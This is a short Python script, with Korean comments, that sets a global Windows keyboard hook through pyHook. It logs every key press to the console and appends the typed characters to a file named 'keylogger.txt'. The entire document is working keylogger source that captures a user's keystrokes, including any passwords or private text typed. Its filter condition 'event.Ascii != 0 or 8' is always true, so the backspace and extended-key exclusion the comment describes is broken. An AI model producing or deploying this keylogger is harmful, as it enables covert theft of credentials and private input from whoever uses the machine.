
import pythoncom, pyHook

def OnKeyboardEvent(event):
    buffer = ''
    print ('MessageName:',event.MessageName)
    print ('Message:',event.Message)
    print ('Time:',event.Time)
    print ('Window:',event.Window)
    print ('WindowName:',event.WindowName)
    print ('Ascii:', event.Ascii, chr(event.Ascii))
    print ('Key:', event.Key)
    print ('KeyID:', event.KeyID)
    print ('ScanCode:', event.ScanCode)
    print ('Extended:', event.Extended)
    print ('Injected:', event.Injected)
    print ('Alt', event.Alt)
    print ('Transition', event.Transition)
    print ('-----------------------')

    if event.Ascii != 0 or 8: # extended, backspace 제외
        f = open('keylogger.txt', mode = 'at')
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: # enter 입력
            keylogs = '\n'
        buffer += keylogs 
        f.write(buffer)
        f.close()

# return True to pass the event to other handlers
    return True

if __name__ == '__main__':
    # create a hook manager
    hm = pyHook.HookManager()
    # watch for all keyboard events
    hm.KeyDown = OnKeyboardEvent
    # hm.KeyUp = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()
